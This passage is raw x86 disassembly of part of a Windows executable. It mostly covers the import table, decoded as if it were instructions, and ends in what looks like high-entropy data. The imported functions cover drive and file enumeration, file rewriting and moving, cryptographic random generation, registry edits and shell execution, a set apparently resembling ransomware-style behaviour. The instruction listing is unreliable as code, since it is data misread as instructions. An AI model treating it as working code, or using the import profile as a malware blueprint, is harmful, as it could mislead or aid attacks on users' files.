  40cbf6:	00 00                	add    %al,(%eax)
  40cbf8:	5e                   	pop    %esi
  40cbf9:	cc                   	int3
  40cbfa:	00 00                	add    %al,(%eax)
  40cbfc:	50                   	push   %eax
  40cbfd:	cc                   	int3
  40cbfe:	00 00                	add    %al,(%eax)
  40cc00:	dc cd                	fmul   %st,%st(5)
  40cc02:	00 00                	add    %al,(%eax)
  40cc04:	44                   	inc    %esp
  40cc05:	cc                   	int3
  40cc06:	00 00                	add    %al,(%eax)
  40cc08:	00 00                	add    %al,(%eax)
  40cc0a:	00 00                	add    %al,(%eax)
  40cc0c:	e8 cf 00 00 d6       	call   0xd640cce0
  40cc11:	cf                   	iret
  40cc12:	00 00                	add    %al,(%eax)
  40cc14:	00 00                	add    %al,(%eax)
  40cc16:	00 00                	add    %al,(%eax)
  40cc18:	1a d0                	sbb    %al,%dl
  40cc1a:	00 00                	add    %al,(%eax)
  40cc1c:	2e d0 00             	rolb   $1,%cs:(%eax)
  40cc1f:	00 06                	add    %al,(%esi)
  40cc21:	d0 00                	rolb   $1,(%eax)
  40cc23:	00 00                	add    %al,(%eax)
  40cc25:	00 00                	add    %al,(%eax)
  40cc27:	00 50 d0             	add    %dl,-0x30(%eax)
  40cc2a:	00 00                	add    %al,(%eax)
  40cc2c:	5c                   	pop    %esp
  40cc2d:	d0 00                	rolb   $1,(%eax)
  40cc2f:	00 66 d0             	add    %ah,-0x30(%esi)
  40cc32:	00 00                	add    %al,(%eax)
  40cc34:	70 d0                	jo     0x40cc06
  40cc36:	00 00                	add    %al,(%eax)
  40cc38:	84 d0                	test   %dl,%al
  40cc3a:	00 00                	add    %al,(%eax)
  40cc3c:	90                   	nop
  40cc3d:	d0 00                	rolb   $1,(%eax)
  40cc3f:	00 00                	add    %al,(%eax)
  40cc41:	00 00                	add    %al,(%eax)
  40cc43:	00 cb                	add    %cl,%bl
  40cc45:	02 48 65             	add    0x65(%eax),%cl
  40cc48:	61                   	popa
  40cc49:	70 41                	jo     0x40cc8c
  40cc4b:	6c                   	insb   (%dx),%es:(%edi)
  40cc4c:	6c                   	insb   (%dx),%es:(%edi)
  40cc4d:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc4e:	63 00                	arpl   %eax,(%eax)
  40cc50:	d2 02                	rolb   %cl,(%edx)
  40cc52:	48                   	dec    %eax
  40cc53:	65 61                	gs popa
  40cc55:	70 52                	jo     0x40cca9
  40cc57:	65 41                	gs inc %ecx
  40cc59:	6c                   	insb   (%dx),%es:(%edi)
  40cc5a:	6c                   	insb   (%dx),%es:(%edi)
  40cc5b:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc5c:	63 00                	arpl   %eax,(%eax)
  40cc5e:	cf                   	iret
  40cc5f:	02 48 65             	add    0x65(%eax),%cl
  40cc62:	61                   	popa
  40cc63:	70 46                	jo     0x40ccab
  40cc65:	72 65                	jb     0x40cccc
  40cc67:	65 00 00             	add    %al,%gs:(%eax)
  40cc6a:	4a                   	dec    %edx
  40cc6b:	02 47 65             	add    0x65(%edi),%al
  40cc6e:	74 50                	je     0x40ccc0
  40cc70:	72 6f                	jb     0x40cce1
  40cc72:	63 65 73             	arpl   %esp,0x73(%ebp)
  40cc75:	73 48                	jae    0x40ccbf
  40cc77:	65 61                	gs popa
  40cc79:	70 00                	jo     0x40cc7b
  40cc7b:	00 4d 05             	add    %cl,0x5(%ebp)
  40cc7e:	6c                   	insb   (%dx),%es:(%edi)
  40cc7f:	73 74                	jae    0x40ccf5
  40cc81:	72 6c                	jb     0x40ccef
  40cc83:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cc85:	41                   	inc    %ecx
  40cc86:	00 00                	add    %al,(%eax)
  40cc88:	02 02                	add    (%edx),%al
  40cc8a:	47                   	inc    %edi
  40cc8b:	65 74 4c             	gs je  0x40ccda
  40cc8e:	61                   	popa
  40cc8f:	73 74                	jae    0x40cd05
  40cc91:	45                   	inc    %ebp
  40cc92:	72 72                	jb     0x40cd06
  40cc94:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc95:	72 00                	jb     0x40cc97
  40cc97:	00 f1                	add    %dh,%cl
  40cc99:	01 47 65             	add    %eax,0x65(%edi)
  40cc9c:	74 46                	je     0x40cce4
  40cc9e:	69 6c 65 53 69 7a 65 	imul   $0x45657a69,0x53(%ebp,%eiz,2),%ebp
  40cca5:	45 
  40cca6:	78 00                	js     0x40cca8
  40cca8:	25 05 57 72 69       	and    $0x69725705,%eax
  40ccad:	74 65                	je     0x40cd14
  40ccaf:	46                   	inc    %esi
  40ccb0:	69 6c 65 00 c0 03 52 	imul   $0x655203c0,0x0(%ebp,%eiz,2),%ebp
  40ccb7:	65 
  40ccb8:	61                   	popa
  40ccb9:	64 46                	fs inc %esi
  40ccbb:	69 6c 65 00 00 67 04 	imul   $0x53046700,0x0(%ebp,%eiz,2),%ebp
  40ccc2:	53 
  40ccc3:	65 74 46             	gs je  0x40cd0c
  40ccc6:	69 6c 65 50 6f 69 6e 	imul   $0x746e696f,0x50(%ebp,%eiz,2),%ebp
  40cccd:	74 
  40ccce:	65 72 45             	gs jb  0x40cd16
  40ccd1:	78 00                	js     0x40ccd3
  40ccd3:	00 52 00             	add    %dl,0x0(%edx)
  40ccd6:	43                   	inc    %ebx
  40ccd7:	6c                   	insb   (%dx),%es:(%edi)
  40ccd8:	6f                   	outsl  %ds:(%esi),(%dx)
  40ccd9:	73 65                	jae    0x40cd40
  40ccdb:	48                   	dec    %eax
  40ccdc:	61                   	popa
  40ccdd:	6e                   	outsb  %ds:(%esi),(%dx)
  40ccde:	64 6c                	fs insb (%dx),%es:(%edi)
  40cce0:	65 00 4e 05          	add    %cl,%gs:0x5(%esi)
  40cce4:	6c                   	insb   (%dx),%es:(%edi)
  40cce5:	73 74                	jae    0x40cd5b
  40cce7:	72 6c                	jb     0x40cd55
  40cce9:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cceb:	57                   	push   %edi
  40ccec:	00 00                	add    %al,(%eax)
  40ccee:	8f 00                	pop    (%eax)
  40ccf0:	43                   	inc    %ebx
  40ccf1:	72 65                	jb     0x40cd58
  40ccf3:	61                   	popa
  40ccf4:	74 65                	je     0x40cd5b
  40ccf6:	46                   	inc    %esi
  40ccf7:	69 6c 65 57 00 cd 02 	imul   $0x4802cd00,0x57(%ebp,%eiz,2),%ebp
  40ccfe:	48 
  40ccff:	65 61                	gs popa
  40cd01:	70 43                	jo     0x40cd46
  40cd03:	72 65                	jb     0x40cd6a
  40cd05:	61                   	popa
  40cd06:	74 65                	je     0x40cd6d
  40cd08:	00 00                	add    %al,(%eax)
  40cd0a:	c0 01 47             	rolb   $0x47,(%ecx)
  40cd0d:	65 74 43             	gs je  0x40cd53
  40cd10:	75 72                	jne    0x40cd84
  40cd12:	72 65                	jb     0x40cd79
  40cd14:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd15:	74 50                	je     0x40cd67
  40cd17:	72 6f                	jb     0x40cd88
  40cd19:	63 65 73             	arpl   %esp,0x73(%ebp)
  40cd1c:	73 00                	jae    0x40cd1e
  40cd1e:	19 01                	sbb    %eax,(%ecx)
  40cd20:	45                   	inc    %ebp
  40cd21:	78 69                	js     0x40cd8c
  40cd23:	74 50                	je     0x40cd75
  40cd25:	72 6f                	jb     0x40cd96
  40cd27:	63 65 73             	arpl   %esp,0x73(%ebp)
  40cd2a:	73 00                	jae    0x40cd2c
  40cd2c:	b5 00                	mov    $0x0,%ch
  40cd2e:	43                   	inc    %ebx
  40cd2f:	72 65                	jb     0x40cd96
  40cd31:	61                   	popa
  40cd32:	74 65                	je     0x40cd99
  40cd34:	54                   	push   %esp
  40cd35:	68 72 65 61 64       	push   $0x64616572
  40cd3a:	00 00                	add    %al,(%eax)
  40cd3c:	c4 01                	les    (%ecx),%eax
  40cd3e:	47                   	inc    %edi
  40cd3f:	65 74 43             	gs je  0x40cd85
  40cd42:	75 72                	jne    0x40cdb6
  40cd44:	72 65                	jb     0x40cdab
  40cd46:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd47:	74 54                	je     0x40cd9d
  40cd49:	68 72 65 61 64       	push   $0x64616572
  40cd4e:	00 00                	add    %al,(%eax)
  40cd50:	99                   	cltd
  40cd51:	04 53                	add    $0x53,%al
  40cd53:	65 74 54             	gs je  0x40cdaa
  40cd56:	68 72 65 61 64       	push   $0x64616572
  40cd5b:	50                   	push   %eax
  40cd5c:	72 69                	jb     0x40cdc7
  40cd5e:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd5f:	72 69                	jb     0x40cdca
  40cd61:	74 79                	je     0x40cddc
  40cd63:	00 f7                	add    %dh,%bh
  40cd65:	04 57                	add    $0x57,%al
  40cd67:	61                   	popa
  40cd68:	69 74 46 6f 72 4d 75 	imul   $0x6c754d72,0x6f(%esi,%eax,2),%esi
  40cd6f:	6c 
  40cd70:	74 69                	je     0x40cddb
  40cd72:	70 6c                	jo     0x40cde0
  40cd74:	65 4f                	gs dec %edi
  40cd76:	62 6a 65             	bound  %ebp,0x65(%edx)
  40cd79:	63 74 73 00          	arpl   %esi,0x0(%ebx,%esi,2)
  40cd7d:	00 b2 04 53 6c 65    	add    %dh,0x656c5304(%edx)
  40cd83:	65 70 00             	gs jo  0x40cd86
  40cd86:	09 02                	or     %eax,(%edx)
  40cd88:	47                   	inc    %edi
  40cd89:	65 74 4c             	gs je  0x40cdd8
  40cd8c:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd8d:	67 69 63 61 6c 44 72 	imul   $0x6972446c,0x61(%bp,%di),%esp
  40cd94:	69 
  40cd95:	76 65                	jbe    0x40cdfc
  40cd97:	73 00                	jae    0x40cd99
  40cd99:	00 66 04             	add    %ah,0x4(%esi)
  40cd9c:	53                   	push   %ebx
  40cd9d:	65 74 46             	gs je  0x40cde6
  40cda0:	69 6c 65 50 6f 69 6e 	imul   $0x746e696f,0x50(%ebp,%eiz,2),%ebp
  40cda7:	74 
  40cda8:	65 72 00             	gs jb  0x40cdab
  40cdab:	00 2e                	add    %ch,(%esi)
  40cdad:	01 46 69             	add    %eax,0x69(%esi)
  40cdb0:	6e                   	outsb  %ds:(%esi),(%dx)
  40cdb1:	64 43                	fs inc %ebx
  40cdb3:	6c                   	insb   (%dx),%es:(%edi)
  40cdb4:	6f                   	outsl  %ds:(%esi),(%dx)
  40cdb5:	73 65                	jae    0x40ce1c
  40cdb7:	00 44 05 6c          	add    %al,0x6c(%ebp,%eax,1)
  40cdbb:	73 74                	jae    0x40ce31
  40cdbd:	72 63                	jb     0x40ce22
  40cdbf:	6d                   	insl   (%dx),%es:(%edi)
  40cdc0:	70 69                	jo     0x40ce2b
  40cdc2:	41                   	inc    %ecx
  40cdc3:	00 45 05             	add    %al,0x5(%ebp)
  40cdc6:	6c                   	insb   (%dx),%es:(%edi)
  40cdc7:	73 74                	jae    0x40ce3d
  40cdc9:	72 63                	jb     0x40ce2e
  40cdcb:	6d                   	insl   (%dx),%es:(%edi)
  40cdcc:	70 69                	jo     0x40ce37
  40cdce:	57                   	push   %edi
  40cdcf:	00 47 05             	add    %al,0x5(%edi)
  40cdd2:	6c                   	insb   (%dx),%es:(%edi)
  40cdd3:	73 74                	jae    0x40ce49
  40cdd5:	72 63                	jb     0x40ce3a
  40cdd7:	70 79                	jo     0x40ce52
  40cdd9:	41                   	inc    %ecx
  40cdda:	00 00                	add    %al,(%eax)
  40cddc:	48                   	dec    %eax
  40cddd:	05 6c 73 74 72       	add    $0x7274736c,%eax
  40cde2:	63 70 79             	arpl   %esi,0x79(%eax)
  40cde5:	57                   	push   %edi
  40cde6:	00 00                	add    %al,(%eax)
  40cde8:	3f                   	aas
  40cde9:	05 6c 73 74 72       	add    $0x7274736c,%eax
  40cdee:	63 61 74             	arpl   %esp,0x74(%ecx)
  40cdf1:	57                   	push   %edi
  40cdf2:	00 00                	add    %al,(%eax)
  40cdf4:	14 02                	adc    $0x2,%al
  40cdf6:	47                   	inc    %edi
  40cdf7:	65 74 4d             	gs je  0x40ce47
  40cdfa:	6f                   	outsl  %ds:(%esi),(%dx)
  40cdfb:	64 75 6c             	fs jne 0x40ce6a
  40cdfe:	65 46                	gs inc %esi
  40ce00:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40ce07:	57 
  40ce08:	00 00                	add    %al,(%eax)
  40ce0a:	a8 00                	test   $0x0,%al
  40ce0c:	43                   	inc    %ebx
  40ce0d:	72 65                	jb     0x40ce74
  40ce0f:	61                   	popa
  40ce10:	74 65                	je     0x40ce77
  40ce12:	50                   	push   %eax
  40ce13:	72 6f                	jb     0x40ce84
  40ce15:	63 65 73             	arpl   %esp,0x73(%ebp)
  40ce18:	73 57                	jae    0x40ce71
  40ce1a:	00 00                	add    %al,(%eax)
  40ce1c:	dc 01                	faddl  (%ecx)
  40ce1e:	47                   	inc    %edi
  40ce1f:	65 74 45             	gs je  0x40ce67
  40ce22:	6e                   	outsb  %ds:(%esi),(%dx)
  40ce23:	76 69                	jbe    0x40ce8e
  40ce25:	72 6f                	jb     0x40ce96
  40ce27:	6e                   	outsb  %ds:(%esi),(%dx)
  40ce28:	6d                   	insl   (%dx),%es:(%edi)
  40ce29:	65 6e                	outsb  %gs:(%esi),(%dx)
  40ce2b:	74 56                	je     0x40ce83
  40ce2d:	61                   	popa
  40ce2e:	72 69                	jb     0x40ce99
  40ce30:	61                   	popa
  40ce31:	62 6c 65 57          	bound  %ebp,0x57(%ebp,%eiz,2)
  40ce35:	00 d2                	add    %dl,%dl
  40ce37:	01 47 65             	add    %eax,0x65(%edi)
  40ce3a:	74 44                	je     0x40ce80
  40ce3c:	72 69                	jb     0x40cea7
  40ce3e:	76 65                	jbe    0x40cea5
  40ce40:	54                   	push   %esp
  40ce41:	79 70                	jns    0x40ceb3
  40ce43:	65 41                	gs inc %ecx
  40ce45:	00 85 02 47 65 74    	add    %al,0x74654702(%ebp)
  40ce4b:	54                   	push   %esp
  40ce4c:	65 6d                	gs insl (%dx),%es:(%edi)
  40ce4e:	70 50                	jo     0x40cea0
  40ce50:	61                   	popa
  40ce51:	74 68                	je     0x40cebb
  40ce53:	57                   	push   %edi
  40ce54:	00 00                	add    %al,(%eax)
  40ce56:	83 02 47             	addl   $0x47,(%edx)
  40ce59:	65 74 54             	gs je  0x40ceb0
  40ce5c:	65 6d                	gs insl (%dx),%es:(%edi)
  40ce5e:	70 46                	jo     0x40cea6
  40ce60:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40ce67:	57 
  40ce68:	00 00                	add    %al,(%eax)
  40ce6a:	61                   	popa
  40ce6b:	04 53                	add    $0x53,%al
  40ce6d:	65 74 46             	gs je  0x40ceb6
  40ce70:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  40ce77:	69 
  40ce78:	62 75 74             	bound  %esi,0x74(%ebp)
  40ce7b:	65 73 57             	gs jae 0x40ced5
  40ce7e:	00 00                	add    %al,(%eax)
  40ce80:	ea 01 47 65 74 46 69 	ljmp   $0x6946,$0x74654701
  40ce87:	6c                   	insb   (%dx),%es:(%edi)
  40ce88:	65 41                	gs inc %ecx
  40ce8a:	74 74                	je     0x40cf00
  40ce8c:	72 69                	jb     0x40cef7
  40ce8e:	62 75 74             	bound  %esi,0x74(%ebp)
  40ce91:	65 73 57             	gs jae 0x40ceeb
  40ce94:	00 00                	add    %al,(%eax)
  40ce96:	39 01                	cmp    %eax,(%ecx)
  40ce98:	46                   	inc    %esi
  40ce99:	69 6e 64 46 69 72 73 	imul   $0x73726946,0x64(%esi),%ebp
  40cea0:	74 46                	je     0x40cee8
  40cea2:	69 6c 65 57 00 00 45 	imul   $0x1450000,0x57(%ebp,%eiz,2),%ebp
  40cea9:	01 
  40ceaa:	46                   	inc    %esi
  40ceab:	69 6e 64 4e 65 78 74 	imul   $0x7478654e,0x64(%esi),%ebp
  40ceb2:	46                   	inc    %esi
  40ceb3:	69 6c 65 57 00 75 00 	imul   $0x43007500,0x57(%ebp,%eiz,2),%ebp
  40ceba:	43 
  40cebb:	6f                   	outsl  %ds:(%esi),(%dx)
  40cebc:	70 79                	jo     0x40cf37
  40cebe:	46                   	inc    %esi
  40cebf:	69 6c 65 57 00 60 03 	imul   $0x4d036000,0x57(%ebp,%eiz,2),%ebp
  40cec6:	4d 
  40cec7:	6f                   	outsl  %ds:(%esi),(%dx)
  40cec8:	76 65                	jbe    0x40cf2f
  40ceca:	46                   	inc    %esi
  40cecb:	69 6c 65 45 78 57 00 	imul   $0x7d005778,0x45(%ebp,%eiz,2),%ebp
  40ced2:	7d 
  40ced3:	04 53                	add    $0x53,%al
  40ced5:	65 74 50             	gs je  0x40cf28
  40ced8:	72 69                	jb     0x40cf43
  40ceda:	6f                   	outsl  %ds:(%esi),(%dx)
  40cedb:	72 69                	jb     0x40cf46
  40cedd:	74 79                	je     0x40cf58
  40cedf:	43                   	inc    %ebx
  40cee0:	6c                   	insb   (%dx),%es:(%edi)
  40cee1:	61                   	popa
  40cee2:	73 73                	jae    0x40cf57
  40cee4:	00 00                	add    %al,(%eax)
  40cee6:	67 03 4d 75          	add    0x75(%di),%ecx
  40ceea:	6c                   	insb   (%dx),%es:(%edi)
  40ceeb:	74 69                	je     0x40cf56
  40ceed:	42                   	inc    %edx
  40ceee:	79 74                	jns    0x40cf64
  40cef0:	65 54                	gs push %esp
  40cef2:	6f                   	outsl  %ds:(%esi),(%dx)
  40cef3:	57                   	push   %edi
  40cef4:	69 64 65 43 68 61 72 	imul   $0x726168,0x43(%ebp,%eiz,2),%esp
  40cefb:	00 
  40cefc:	11 05 57 69 64 65    	adc    %eax,0x65646957
  40cf02:	43                   	inc    %ebx
  40cf03:	68 61 72 54 6f       	push   $0x6f547261
  40cf08:	4d                   	dec    %ebp
  40cf09:	75 6c                	jne    0x40cf77
  40cf0b:	74 69                	je     0x40cf76
  40cf0d:	42                   	inc    %edx
  40cf0e:	79 74                	jns    0x40cf84
  40cf10:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40cf14:	43                   	inc    %ebx
  40cf15:	6f                   	outsl  %ds:(%esi),(%dx)
  40cf16:	6d                   	insl   (%dx),%es:(%edi)
  40cf17:	70 61                	jo     0x40cf7a
  40cf19:	72 65                	jb     0x40cf80
  40cf1b:	53                   	push   %ebx
  40cf1c:	74 72                	je     0x40cf90
  40cf1e:	69 6e 67 41 00 00 4b 	imul   $0x4b000041,0x67(%esi),%ebp
  40cf25:	45                   	inc    %ebp
  40cf26:	52                   	push   %edx
  40cf27:	4e                   	dec    %esi
  40cf28:	45                   	inc    %ebp
  40cf29:	4c                   	dec    %esp
  40cf2a:	33 32                	xor    (%edx),%esi
  40cf2c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40cf2f:	6c                   	insb   (%dx),%es:(%edi)
  40cf30:	00 00                	add    %al,(%eax)
  40cf32:	b1 00                	mov    $0x0,%cl
  40cf34:	43                   	inc    %ebx
  40cf35:	72 79                	jb     0x40cfb0
  40cf37:	70 74                	jo     0x40cfad
  40cf39:	41                   	inc    %ecx
  40cf3a:	63 71 75             	arpl   %esi,0x75(%ecx)
  40cf3d:	69 72 65 43 6f 6e 74 	imul   $0x746e6f43,0x65(%edx),%esi
  40cf44:	65 78 74             	gs js  0x40cfbb
  40cf47:	57                   	push   %edi
  40cf48:	00 00                	add    %al,(%eax)
  40cf4a:	cb                   	lret
  40cf4b:	00 43 72             	add    %al,0x72(%ebx)
  40cf4e:	79 70                	jns    0x40cfc0
  40cf50:	74 52                	je     0x40cfa4
  40cf52:	65 6c                	gs insb (%dx),%es:(%edi)
  40cf54:	65 61                	gs popa
  40cf56:	73 65                	jae    0x40cfbd
  40cf58:	43                   	inc    %ebx
  40cf59:	6f                   	outsl  %ds:(%esi),(%dx)
  40cf5a:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf5b:	74 65                	je     0x40cfc2
  40cf5d:	78 74                	js     0x40cfd3
  40cf5f:	00 c1                	add    %al,%cl
  40cf61:	00 43 72             	add    %al,0x72(%ebx)
  40cf64:	79 70                	jns    0x40cfd6
  40cf66:	74 47                	je     0x40cfaf
  40cf68:	65 6e                	outsb  %gs:(%esi),(%dx)
  40cf6a:	52                   	push   %edx
  40cf6b:	61                   	popa
  40cf6c:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf6d:	64 6f                	outsl  %fs:(%esi),(%dx)
  40cf6f:	6d                   	insl   (%dx),%es:(%edi)
  40cf70:	00 00                	add    %al,(%eax)
  40cf72:	30 02                	xor    %al,(%edx)
  40cf74:	52                   	push   %edx
  40cf75:	65 67 43             	gs addr16 inc %ebx
  40cf78:	6c                   	insb   (%dx),%es:(%edi)
  40cf79:	6f                   	outsl  %ds:(%esi),(%dx)
  40cf7a:	73 65                	jae    0x40cfe1
  40cf7c:	4b                   	dec    %ebx
  40cf7d:	65 79 00             	gs jns 0x40cf80
  40cf80:	39 02                	cmp    %eax,(%edx)
  40cf82:	52                   	push   %edx
  40cf83:	65 67 43             	gs addr16 inc %ebx
  40cf86:	72 65                	jb     0x40cfed
  40cf88:	61                   	popa
  40cf89:	74 65                	je     0x40cff0
  40cf8b:	4b                   	dec    %ebx
  40cf8c:	65 79 45             	gs jns 0x40cfd4
  40cf8f:	78 57                	js     0x40cfe8
  40cf91:	00 61 02             	add    %ah,0x2(%ecx)
  40cf94:	52                   	push   %edx
  40cf95:	65 67 4f             	gs addr16 dec %edi
  40cf98:	70 65                	jo     0x40cfff
  40cf9a:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf9b:	4b                   	dec    %ebx
  40cf9c:	65 79 45             	gs jns 0x40cfe4
  40cf9f:	78 57                	js     0x40cff8
  40cfa1:	00 6e 02             	add    %ch,0x2(%esi)
  40cfa4:	52                   	push   %edx
  40cfa5:	65 67 51             	gs addr16 push %ecx
  40cfa8:	75 65                	jne    0x40d00f
  40cfaa:	72 79                	jb     0x40d025
  40cfac:	56                   	push   %esi
  40cfad:	61                   	popa
  40cfae:	6c                   	insb   (%dx),%es:(%edi)
  40cfaf:	75 65                	jne    0x40d016
  40cfb1:	45                   	inc    %ebp
  40cfb2:	78 57                	js     0x40d00b
  40cfb4:	00 00                	add    %al,(%eax)
  40cfb6:	7e 02                	jle    0x40cfba
  40cfb8:	52                   	push   %edx
  40cfb9:	65 67 53             	gs addr16 push %ebx
  40cfbc:	65 74 56             	gs je  0x40d015
  40cfbf:	61                   	popa
  40cfc0:	6c                   	insb   (%dx),%es:(%edi)
  40cfc1:	75 65                	jne    0x40d028
  40cfc3:	45                   	inc    %ebp
  40cfc4:	78 57                	js     0x40d01d
  40cfc6:	00 00                	add    %al,(%eax)
  40cfc8:	41                   	inc    %ecx
  40cfc9:	44                   	inc    %esp
  40cfca:	56                   	push   %esi
  40cfcb:	41                   	inc    %ecx
  40cfcc:	50                   	push   %eax
  40cfcd:	49                   	dec    %ecx
  40cfce:	33 32                	xor    (%edx),%esi
  40cfd0:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40cfd3:	6c                   	insb   (%dx),%es:(%edi)
  40cfd4:	00 00                	add    %al,(%eax)
  40cfd6:	21 01                	and    %eax,(%ecx)
  40cfd8:	53                   	push   %ebx
  40cfd9:	68 65 6c 6c 45       	push   $0x456c6c65
  40cfde:	78 65                	js     0x40d045
  40cfe0:	63 75 74             	arpl   %esi,0x74(%ebp)
  40cfe3:	65 45                	gs inc %ebp
  40cfe5:	78 57                	js     0x40d03e
  40cfe7:	00 7f 00             	add    %bh,0x0(%edi)
  40cfea:	53                   	push   %ebx
  40cfeb:	48                   	dec    %eax
  40cfec:	43                   	inc    %ebx
  40cfed:	68 61 6e 67 65       	push   $0x65676e61
  40cff2:	4e                   	dec    %esi
  40cff3:	6f                   	outsl  %ds:(%esi),(%dx)
  40cff4:	74 69                	je     0x40d05f
  40cff6:	66 79 00             	data16 jns 0x40cff9
  40cff9:	00 53 48             	add    %dl,0x48(%ebx)
  40cffc:	45                   	inc    %ebp
  40cffd:	4c                   	dec    %esp
  40cffe:	4c                   	dec    %esp
  40cfff:	33 32                	xor    (%edx),%esi
  40d001:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40d004:	6c                   	insb   (%dx),%es:(%edi)
  40d005:	00 30                	add    %dh,(%eax)
  40d007:	00 50 61             	add    %dl,0x61(%eax)
  40d00a:	74 68                	je     0x40d074
  40d00c:	41                   	inc    %ecx
  40d00d:	64 64 42             	fs fs inc %edx
  40d010:	61                   	popa
  40d011:	63 6b 73             	arpl   %ebp,0x73(%ebx)
  40d014:	6c                   	insb   (%dx),%es:(%edi)
  40d015:	61                   	popa
  40d016:	73 68                	jae    0x40d080
  40d018:	57                   	push   %edi
  40d019:	00 49 00             	add    %cl,0x0(%ecx)
  40d01c:	50                   	push   %eax
  40d01d:	61                   	popa
  40d01e:	74 68                	je     0x40d088
  40d020:	46                   	inc    %esi
  40d021:	69 6e 64 46 69 6c 65 	imul   $0x656c6946,0x64(%esi),%ebp
  40d028:	4e                   	dec    %esi
  40d029:	61                   	popa
  40d02a:	6d                   	insl   (%dx),%es:(%edi)
  40d02b:	65 57                	gs push %edi
  40d02d:	00 8b 00 50 61 74    	add    %cl,0x74615000(%ebx)
  40d033:	68 52 65 6d 6f       	push   $0x6f6d6552
  40d038:	76 65                	jbe    0x40d09f
  40d03a:	46                   	inc    %esi
  40d03b:	69 6c 65 53 70 65 63 	imul   $0x57636570,0x53(%ebp,%eiz,2),%ebp
  40d042:	57 
  40d043:	00 53 48             	add    %dl,0x48(%ebx)
  40d046:	4c                   	dec    %esp
  40d047:	57                   	push   %edi
  40d048:	41                   	inc    %ecx
  40d049:	50                   	push   %eax
  40d04a:	49                   	dec    %ecx
  40d04b:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40d04e:	6c                   	insb   (%dx),%es:(%edi)
  40d04f:	00 fe                	add    %bh,%dh
  40d051:	04 5f                	add    $0x5f,%al
  40d053:	61                   	popa
  40d054:	75 6c                	jne    0x40d0c2
  40d056:	6c                   	insb   (%dx),%es:(%edi)
  40d057:	64 69 76 00 00 f6 04 	imul   $0x5f04f600,%fs:0x0(%esi),%esi
  40d05e:	5f 
  40d05f:	61                   	popa
  40d060:	6c                   	insb   (%dx),%es:(%edi)
  40d061:	6c                   	insb   (%dx),%es:(%edi)
  40d062:	64 69 76 00 fa 04 5f 	imul   $0x615f04fa,%fs:0x0(%esi),%esi
  40d069:	61 
  40d06a:	6c                   	insb   (%dx),%es:(%edi)
  40d06b:	6c                   	insb   (%dx),%es:(%edi)
  40d06c:	72 65                	jb     0x40d0d3
  40d06e:	6d                   	insl   (%dx),%es:(%edi)
  40d06f:	00 02                	add    %al,(%edx)
  40d071:	05 5f 63 68 6b       	add    $0x6b68635f,%eax
  40d076:	73 74                	jae    0x40d0ec
  40d078:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40d07b:	74 64                	je     0x40d0e1
  40d07d:	6c                   	insb   (%dx),%es:(%edi)
  40d07e:	6c                   	insb   (%dx),%es:(%edi)
  40d07f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40d082:	6c                   	insb   (%dx),%es:(%edi)
  40d083:	00 96 03 52 74 6c    	add    %dl,0x6c745203(%esi)
  40d089:	55                   	push   %ebp
  40d08a:	6e                   	outsb  %ds:(%esi),(%dx)
  40d08b:	77 69                	ja     0x40d0f6
  40d08d:	6e                   	outsb  %ds:(%esi),(%dx)
  40d08e:	64 00 35 01 4e 74 51 	add    %dh,%fs:0x51744e01
  40d095:	75 65                	jne    0x40d0fc
  40d097:	72 79                	jb     0x40d112
  40d099:	56                   	push   %esi
  40d09a:	69 72 74 75 61 6c 4d 	imul   $0x4d6c6175,0x74(%edx),%esi
  40d0a1:	65 6d                	gs insl (%dx),%es:(%edi)
  40d0a3:	6f                   	outsl  %ds:(%esi),(%dx)
  40d0a4:	72 79                	jb     0x40d11f
  40d0a6:	00 00                	add    %al,(%eax)
  40d0a8:	e7 67                	out    %eax,$0x67
  40d0aa:	4d                   	dec    %ebp
  40d0ab:	b0 c0                	mov    $0xc0,%al
  40d0ad:	b0 05                	mov    $0x5,%al
  40d0af:	2f                   	das
  40d0b0:	8f 44 73 f3          	pop    -0xd(%ebx,%esi,2)
  40d0b4:	64 c8 47 8e 31       	fs enter $0x8e47,$0x31
  40d0b9:	47                   	inc    %edi
  40d0ba:	16                   	push   %ss
  40d0bb:	eb 85                	jmp    0x40d042
  40d0bd:	0c 21                	or     $0x21,%al
  40d0bf:	e3 ef                	jecxz  0x40d0b0
  40d0c1:	14 49                	adc    $0x49,%al
  40d0c3:	b4 f2                	mov    $0xf2,%ah
  40d0c5:	2a b5 08 74 c3 53    	sub    0x53c37408(%ebp),%dh
  40d0cb:	df 4b ff             	fisttps -0x1(%ebx)
  40d0ce:	eb 6f                	jmp    0x40d13f
  40d0d0:	d4 11                	aam    $0x11
  40d0d2:	58                   	pop    %eax
  40d0d3:	92                   	xchg   %eax,%edx
  40d0d4:	11 e8                	adc    %ebp,%eax
  40d0d6:	67 6d                	insl   (%dx),%es:(%di)
  40d0d8:	41                   	inc    %ecx
  40d0d9:	c4                   	(bad)
  40d0da:	df ab 67 c0 74 08    	fildll 0x874c067(%ebx)
  40d0e0:	ce                   	into
  40d0e1:	d5 84                	aad    $0x84
  40d0e3:	4d                   	dec    %ebp
  40d0e4:	b3 b0                	mov    $0xb0,%bl
  40d0e6:	1c e3                	sbb    $0xe3,%al
  40d0e8:	f4                   	hlt
  40d0e9:	bc b3 3f 19 f9       	mov    $0xf9193fb3,%esp
  40d0ee:	7f c6                	jg     0x40d0b6
